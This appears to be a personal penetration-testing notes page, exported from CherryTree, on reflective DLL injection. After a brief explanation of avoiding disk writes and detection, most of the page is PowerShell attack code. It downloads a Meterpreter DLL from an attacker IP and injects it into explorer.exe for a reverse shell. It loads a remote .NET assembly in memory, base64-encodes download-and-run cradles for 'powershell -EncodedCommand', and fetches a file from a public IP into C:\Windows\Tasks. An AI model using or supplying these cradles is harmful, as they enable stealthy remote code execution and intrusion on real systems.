<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>reflective dll injection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>reflective dll injection</h1><br/><p><h2>Reflective DLL Injection</h2><ul><li><small>problems of classical dll injection: </small><ul><li><small>write dlls to disk </small></li></ul></li><li><small>since we are only interested in the memory mapping of the DLL</small><ul><li><small>Reflective DLL injection parses the relevant fields of the DLLâ€™s Portable Executable260 (PE) file format and maps the contents into memory.</small></li></ul></li><li><small>The ultimate goal of this technique is to maintain the essential functionality of LoadLibrary while avoiding the write to disk and avoiding detection by tools such as Process Explorer.</small></li></ul></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># METHOD 1 </span><br /><span style="color:#0088ff;font-weight:400">$bytes</span> <span style="color:#ff9d00;font-weight:700">=</span> (<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).DownloadData(<span style="color:#333333;font-weight:400">&#39;http://192.168.119.120/met.dll&#39;</span>)<br /><span style="color:#0088ff;font-weight:400">$procid</span> <span style="color:#ff9d00;font-weight:700">=</span> (<span style="color:#ff9d00;font-weight:700">Get-Process</span> <span style="color:#333333;font-weight:400">-Name</span> explorer).Id<br /><br /><span style="color:#ff9d00;font-weight:700">Import-Module</span> C<span style="color:#ff9d00;font-weight:700">:\</span>Tools<span style="color:#ff9d00;font-weight:700">\</span><span style="color:#00117f;font-weight:400">Invoke-ReflectivePEInjection</span>.ps1<br /><span style="color:#00117f;font-weight:400">Invoke-ReflectivePEInjection</span> <span style="color:#ff9d00;font-weight:700">-</span>PEBytes <span style="color:#0088ff;font-weight:400">$bytes</span> <span style="color:#ff9d00;font-weight:700">-</span>ProcId <span style="color:#0088ff;font-weight:400">$procid</span><br /><span style="color:#0088ff;font-weight:400">## This loads the DLL in memory and provides us with a reverse Meterpreter shell:</span><br /><br /><span style="color:#0088ff;font-weight:400"># METHOD 2</span><br /><span style="color:#0088ff;font-weight:400">## need to change class name , etc </span><br /><br /><span style="color:#0088ff;font-weight:400">$data</span> <span style="color:#ff9d00;font-weight:700">=</span> (<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).DownloadData(<span style="color:#333333;font-weight:400">&#39;http://192.168.45.184/entry.dll&#39;</span>);<span style="color:#0088ff;font-weight:400">$assem</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Reflection.Assembly]<span style="color:#ff9d00;font-weight:700">::</span>Load(<span style="color:#0088ff;font-weight:400">$data</span>);<span style="color:#0088ff;font-weight:400">$class</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$assem</span>.GetType(<span style="color:#3ad900;font-weight:400">&quot;ClassLibrary1.Program&quot;</span>);<span style="color:#0088ff;font-weight:400">$method</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$class</span>.GetMethod(<span style="color:#3ad900;font-weight:400">&quot;Run&quot;</span>);<span style="color:#0088ff;font-weight:400">$method</span>.Invoke(<span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$null</span>)<br /><br /><br /><span style="color:#0088ff;font-weight:400"># ENCODE INTO powershell</span><br /><br /><span style="color:#0088ff;font-weight:400"># need to change class name , etc !!!!!!!!!!!</span><br /><br /><span style="color:#0088ff;font-weight:400">$script</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$data = (New-Object System.Net.WebClient).DownloadData(&#39;http://192.168.45.183/entry.dll&#39;); $assem = [System.Reflection.Assembly]::Load($data); $class = $assem.GetType(&#39;ClassLibrary1.Program&#39;); $method = $class.GetMethod(&#39;Run&#39;); $method.Invoke(0, $null)&quot;</span><br /><span style="color:#0088ff;font-weight:400">$encodedScript</span> <span style="color:#ff9d00;font-weight:700">=</span> [Convert]<span style="color:#ff9d00;font-weight:700">::</span>ToBase64String([System.Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetBytes(<span style="color:#0088ff;font-weight:400">$script</span>))<br /><span style="color:#ff9d00;font-weight:700">Write-Output</span> <span style="color:#0088ff;font-weight:400">$encodedScript</span><br />powershell <span style="color:#ff9d00;font-weight:700">-</span>EncodedCommand &lt;encodedScript&gt;<br /><br /><br /><span style="color:#0088ff;font-weight:400">$script</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;(New-Object Net.WebClient).DownloadFile(&#39;http://37.60.234.203/test.com&#39;, &#39;C:\Windows\Tasks\random123.com&#39;)&quot;</span><br /><span style="color:#0088ff;font-weight:400">$encodedScript</span> <span style="color:#ff9d00;font-weight:700">=</span> [Convert]<span style="color:#ff9d00;font-weight:700">::</span>ToBase64String([System.Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetBytes(<span style="color:#0088ff;font-weight:400">$script</span>))<br /><span style="color:#ff9d00;font-weight:700">Write-Output</span> <span style="color:#0088ff;font-weight:400">$encodedScript</span></pre></div></p><p></p><p></p></div>
</body>
</html>
